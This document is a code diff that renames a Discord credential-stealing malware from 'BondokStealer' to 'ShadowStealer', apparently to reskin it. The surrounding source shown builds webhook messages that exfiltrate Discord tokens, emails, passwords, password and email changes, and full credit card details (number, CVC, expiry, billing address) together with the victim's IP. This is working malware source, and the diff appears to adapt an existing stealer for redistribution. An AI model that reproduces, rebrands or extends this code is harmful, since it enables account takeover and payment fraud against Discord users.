@@ -71,7 +71,7 @@ function FirstTime() {
 				fs.rmdirSync(path.join(__dirname, "init"));
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "BondokStealer",
+						username: "ShadowStealer",
 						content: "",
 						embeds: [{
 							title: "Discord Initalized (User not Logged in)",
@@ -97,7 +97,7 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "BondokStealer",
+							username: "ShadowStealer",
 							content: "",
 							embeds: [{
 								title: "Discord Initalized",
@@ -160,10 +160,10 @@ function FirstTime() {
 								inline: !1
 							}],
 							author: {
-								name: "BondokStealer"
+								name: "ShadowStealer"
 							},
 							footer: {
-								text: "BondokStealer"
+								text: "ShadowStealer"
 							}
 						}]
 					};
@@ -203,10 +203,10 @@ function FirstTime() {
 									inline: !1
 								}],
 								author: {
-									name: "BondokStealer"
+									name: "ShadowStealer"
 								},
 								footer: {
-									text: "BondokStealer"
+									text: "ShadowStealer"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -453,7 +453,7 @@ function Login(email, password, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "BondokStealer",
+								username: "ShadowStealer",
 								content: "",
 								embeds: [{
 									"title": "User Login",
@@ -497,10 +497,10 @@ function Login(email, password, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "BondokStealer"
+										"name": "ShadowStealer"
 									},
 									"footer": {
-										"text": "BondokStealer"
+										"text": "ShadowStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -510,10 +510,10 @@ function Login(email, password, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "BondokStealer"
+										"name": "ShadowStealer"
 									},
 									"footer": {
-										"text": "BondokStealer"
+										"text": "ShadowStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -526,10 +526,10 @@ function Login(email, password, token) {
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "BondokStealer"
+									"name": "ShadowStealer"
 								},
 								"footer": {
-									"text": "BondokStealer"
+									"text": "ShadowStealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -670,10 +670,10 @@ function Login(email, password, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "BondokStealer"
+													"name": "ShadowStealer"
 												},
 												"footer": {
-													"text": "BondokStealer"
+													"text": "ShadowStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1009,10 +1009,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "BondokStealer"
+													"name": "ShadowStealer"
 												},
 												"footer": {
-													"text": "BondokStealer"
+													"text": "ShadowStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1022,10 +1022,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "BondokStealer"
+													"name": "ShadowStealer"
 												},
 												"footer": {
-													"text": "BondokStealer"
+													"text": "ShadowStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1148,7 +1148,7 @@ function ChangeEmail(newemail, password, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "BondokStealer",
+								username: "ShadowStealer",
 								content: "",
 								embeds: [{
 									"title": "Email Changed",
@@ -1192,10 +1192,10 @@ function ChangeEmail(newemail, password, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "BondokStealer"
+										"name": "ShadowStealer"
 									},
 									"footer": {
-										"text": "BondokStealer"
+										"text": "ShadowStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1205,10 +1205,10 @@ function ChangeEmail(newemail, password, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "BondokStealer"
+										"name": "ShadowStealer"
 									},
 									"footer": {
-										"text": "BondokStealer"
+										"text": "ShadowStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1221,10 +1221,10 @@ function ChangeEmail(newemail, password, token) {
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "BondokStealer"
+									"name": "ShadowStealer"
 								},
 								"footer": {
-									"text": "BondokStealer"
+									"text": "ShadowStealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -1309,7 +1309,7 @@ function ChangeEmail(newemail, password, token) {
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "BondokStealer",
+											username: "ShadowStealer",
 											content: "",
 											embeds: [{
 												"title": "Email Changed",
@@ -1353,10 +1353,10 @@ function ChangeEmail(newemail, password, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "BondokStealer"
+													"name": "ShadowStealer"
 												},
 												"footer": {
-													"text": "BondokStealer"
+													"text": "ShadowStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1366,10 +1366,10 @@ function ChangeEmail(newemail, password, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "BondokStealer"
+													"name": "ShadowStealer"
 												},
 												"footer": {
-													"text": "BondokStealer"
+													"text": "ShadowStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1411,10 +1411,10 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
 					"title": "User Credit Card Added",
 					"description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
 					"author": {
-						"name": "BondokStealer"
+						"name": "ShadowStealer"
 					},
 					"footer": {
-						"text": "BondokStealer"
+						"text": "ShadowStealer"
 					},
 					"thumbnail": {
 						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
